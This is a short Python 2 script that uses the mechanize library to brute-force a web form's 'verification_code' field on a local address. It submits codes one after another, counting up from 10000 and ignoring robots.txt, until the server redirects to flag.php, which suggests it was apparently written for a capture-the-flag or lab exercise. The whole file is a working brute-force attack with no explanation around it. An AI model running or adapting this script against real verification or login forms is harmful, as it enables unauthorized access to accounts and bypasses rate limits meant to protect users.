#!/usr/bin/python
import mechanize
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)


codes = itertools.count(10000, 1)
br.open("http://192.168.99.101:8080")

for code in codes:
    br.select_form(nr=0)
    br.form['verification_code'] = str(code)
    print "Checking " + br.form['verification_code']
    response = br.submit()
    if response.geturl() == "http://192.168.99.101:8080/flag.php":
        print "Correct code is %d" % code
        break
